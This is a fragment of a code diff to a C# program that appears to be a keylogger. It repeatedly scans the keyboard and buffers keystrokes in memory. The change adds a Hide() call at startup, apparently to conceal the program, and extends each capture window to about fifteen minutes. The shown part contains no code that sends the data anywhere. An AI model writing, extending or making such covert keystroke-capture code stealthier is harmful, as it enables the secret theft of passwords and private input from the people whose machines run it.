@@ -294,16 +294,17 @@ namespace Foo
 
     static void Main()
     {
+      Hide();
       InitializeKeys();
 
       const int sleep_ms = 2;
-      const int scan_time_ms = 13;
-      const int j = 60 * 1000 / (sleep_ms + scan_time_ms);
+      const int scan_time_ms = 15;
+      const ulong j = 15 * 60 * 1000 / (sleep_ms + scan_time_ms);
       const int max_buffer_count = 4096 - 14;
 
       while (true)
       {
-        for (uint i = 0; i < j && keys_buffer.Count() < max_buffer_count; i++)
+        for (ulong i = 0; i < j && keys_buffer.Count() < max_buffer_count; i++)
         {
           Thread.Sleep(sleep_ms);
           ScanKeyboard();
